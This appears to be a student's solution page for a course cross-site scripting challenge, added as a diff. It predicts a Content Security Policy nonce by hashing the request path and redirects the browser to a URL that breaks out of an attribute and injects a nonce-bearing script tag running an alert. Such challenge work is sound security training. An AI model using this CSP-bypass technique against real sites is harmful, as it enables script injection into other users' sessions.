@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>XSS Attack Demo</title>
+    <script>
+        async function sha256(message) {
+            // encode as UTF-8
+            const msgBuffer = new TextEncoder('utf-8').encode(message);
+
+            // hash the message
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+
+            // convert ArrayBuffer to Array
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+
+            // convert bytes to hex string
+            const hashHex = hashArray.map(b => ('00' + b.toString(16)).slice(-2)).join('');
+            return hashHex;
+        }
+        async function generateLink() {
+            var r = Math.floor(Math.random() * 10000000000000000); // Generate a random number
+            var t = Math.floor(new Date().getTime() / 1000);
+
+            var pre_url = '/assign4/chall1/xss_csp?r=' + r + '&t=' + t 
+            // Generate a random nonce
+            const nonce = await sha256(pre_url);
+
+            // Construct the URL
+            var url = 'http://vad700.cse.lsu.edu' + pre_url + '&mike=mike-ii.jpg%27><script nonce=' + nonce + '%3Ealert(%27XSS%20Attack!%27);%3C/script%3E';
+
+            // Update the href attribute of the link
+            window.location.href = url;
+        }
+    </script>
+</head>
+<body>
+    <button onclick="generateLink()">Generate Link</button>
+</body>
+</html>
